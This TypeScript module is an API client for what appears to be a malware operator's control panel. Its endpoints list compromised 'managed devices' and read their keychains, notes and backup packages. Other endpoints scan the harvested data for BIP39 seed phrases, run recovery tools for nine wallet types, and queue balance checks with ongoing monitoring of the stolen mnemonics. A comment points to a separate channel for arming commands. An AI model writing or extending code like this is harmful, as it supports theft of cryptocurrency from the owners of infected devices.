import { get, post } from './http'
import type {
  AppRow,
  Bip39Page,
  Bip39WordPage,
  DeviceAssets,
  KeychainDevice,
  KeychainItemRow,
  ManagedDevicesPage,
  NoteRow,
  Paged,
  ProgressResp,
  ResultDetail,
  ResultRow,
  VisitsPage,
  WarFileRow,
  WarScanPage,
  RecoveredWordsPage,
} from './types'

/**
 * 运维面板 /panel/api/* —— DB 聚合视图（设备台账 / 资产 / 钥匙串 / 备忘录 / 结果 / 来访）。
 * 全部只读（指令武装走 /__control，不在本模块）。
 *
 * 收敛后仅保留 Vue 控制台在用的端点；历史端点（overview / access / commands /
 * device/{uuid}/assets / device/{uuid}/apps / profiles / keychain/wallets /
 * keychain/wallet_export / keychain/war_download）已随前端全量迁移 Vue 下线。
 */
export const panelApi = {
  /** 设备列表：服务端分页（每页默认 20），kw/wallet 筛选下推，避免全量回传。
   *  响应含 total（筛选后总数）与 wallet_count（全量钱包设备数）。 */
  devices(kw = '', wallet: 'all' | 'wallet' | 'none' = 'all', page = 1, per = 20) {
    return get<ManagedDevicesPage>('/panel/api/devices', { kw, wallet, page, per })
  },
  progress() {
    return get<ProgressResp>('/panel/api/progress')
  },
  /** 单设备资产钻取（设备详情抽屉）：war 原包下载路径 + 钱包 + 计数 */
  deviceAssets(uuid: string) {
    return get<DeviceAssets>('/panel/api/device/' + encodeURIComponent(uuid) + '/assets')
  },
  apps(kw = '', page = 1, per = 40) {
    return get<Paged<AppRow>>('/panel/api/apps', { kw, page, per })
  },
  notes(kw = '', page = 1, per = 40) {
    return get<Paged<NoteRow>>('/panel/api/notes', { kw, page, per })
  },
  /** 备忘录 BIP39 助记词命中（读记录表 memo_bip39；前端只显示含助记词的条目） */
  memosBip39(page = 1, per = 50, onlyValid = false) {
    return get<Bip39Page>('/panel/api/memos/bip39', { page, per, only_valid: onlyValid ? 1 : 0 })
  },
  /** 触发后台全量扫描（异步 + 单飞，立即返回） */
  memosBip39Scan() {
    return post<{ started?: boolean; running?: boolean; started_at?: string }>('/panel/api/memos/bip39/scan')
  },
  /** 扫描状态（触发后轮询） */
  memosBip39ScanStatus() {
    return get<{ running?: boolean; started_at?: string; finished_at?: string; last?: Record<string, unknown> }>(
      '/panel/api/memos/bip39/scan',
    )
  },
  /** BIP39 词表（2048 词，落库 bip39_words） */
  bip39Words(kw = '', page = 1, per = 100) {
    return get<Bip39WordPage>('/panel/api/bip39/words', { kw, page, per })
  },
  /** war 包文件列表（工具检测模块数据源） */
  warFiles(page = 1, per = 50) {
    return get<Paged<WarFileRow>>('/panel/api/war/files', { page, per })
  },
  /** 运行 tools/smart_forensics.py 解析某 war 包（refresh=1 强制重跑） */
  warAnalyze(packetId: number, refresh = false) {
    return post<Record<string, unknown>>('/panel/api/war/analyze', undefined, {
      params: { packet_id: packetId, refresh: refresh ? 1 : 0 },
    })
  },
  /** 运行 tools/recover_all.py 深度恢复（9 类钱包助记词；较慢） */
  warRecover(packetId: number, refresh = false, pw = '', deepPin = false) {
    return post<Record<string, unknown>>('/panel/api/war/recover', undefined, {
      params: { packet_id: packetId, refresh: refresh ? 1 : 0, pw, deep_pin: deepPin ? 1 : 0 },
    })
  },
  /** /war 自动检测结果（war_scan 表，按设备/命中） */
  warScans(page = 1, per = 50, onlyHit = false) {
    return get<WarScanPage>('/panel/api/war/scans', { page, per, only_hit: onlyHit ? 1 : 0 })
  },
  warScanStats() {
    return get<{ scanned?: number; valid?: number; keystores?: number; mnemonics?: number }>('/panel/api/war/scan/stats')
  },
  warScanDetail(packetId: number) {
    return get<{ packet_id?: number; detail_json?: string }>('/panel/api/war/scan/detail', { packet_id: packetId })
  },
  /** 把尚未检测的历史 war 包入队后台补扫 */
  warScanPending() {
    return post<{ enqueued?: number }>('/panel/api/war/scan/pending')
  },
  /** 助记词库：解析/还原出来的助记词 */
  words(page = 1, per = 50, onlyValid = false, kw = '') {
    return get<RecoveredWordsPage>('/panel/api/words', { page, per, only_valid: onlyValid ? 1 : 0, kw })
  },
  /** 多链余额查询（chainquery 代理）：创建任务（返回 {job}） */
  wordsBalance(mnemonics: string[], tokens = true, prices = true) {
    return post<{ job?: string }>('/panel/api/words/balance', { mnemonics, tokens, prices })
  },
  /** 余额任务进度/结果 */
  wordsBalanceJob(job: string) {
    return get<Record<string, unknown>>('/panel/api/words/balance', { job })
  },
  /** 单条助记词缓存余额（后台自动查好的） */
  wordsDetail(id: number) {
    return get<{ id?: number; balance_json?: string }>('/panel/api/words/detail', { id })
  },
  /** 触发重查余额（id 或 all） */
  wordsRebalance(id = 0, all = false) {
    return post<{ ok?: boolean }>('/panel/api/words/rebalance', undefined, {
      params: all ? { all: 1 } : { id },
    })
  },
  /** 余额自动查询间隔（分钟） */
  wordsConfig() {
    return get<{ interval_min?: number }>('/panel/api/words/config')
  },
  wordsSetConfig(intervalMin: number) {
    return post<{ interval_min?: number }>('/panel/api/words/config', undefined, {
      params: { interval_min: intervalMin },
    })
  },
  /** 监控开关（仅开启监控的条目后台自动查询/周期刷新） */
  wordsMonitor(id: number, on: boolean) {
    return post<{ ok?: boolean; monitored?: boolean }>('/panel/api/words/monitor', undefined, {
      params: { id, on: on ? 1 : 0 },
    })
  },
  /** keychain 钱包命中条目：device 限定设备、wallet 限定钱包规则 */
  keychain(kw = '', tbl = '', wallet = '', page = 1, per = 40, device = '') {
    return get<Paged<KeychainItemRow>>('/panel/api/war', { kw, tbl, wallet, page, per, device })
  },
  keychainDevices() {
    return get<{ devices?: KeychainDevice[] }>('/panel/api/keychain/devices')
  },
  keychainItem(id: number | string) {
    return get<KeychainItemRow>('/panel/api/keychain/item/' + encodeURIComponent(String(id)))
  },
  results(kw = '', page = 1, per = 40) {
    return get<Paged<ResultRow>>('/panel/api/results', { kw, page, per })
  },
  resultDetail(id: number | string) {
    return get<ResultDetail>('/panel/api/result/' + encodeURIComponent(String(id)))
  },
  /** 访问统计（服务端分页，每页默认 20；kw 筛选下推） */
  visits(kw = '', page = 1, per = 20) {
    return get<VisitsPage>('/panel/api/visits', { kw, page, per })
  },
}
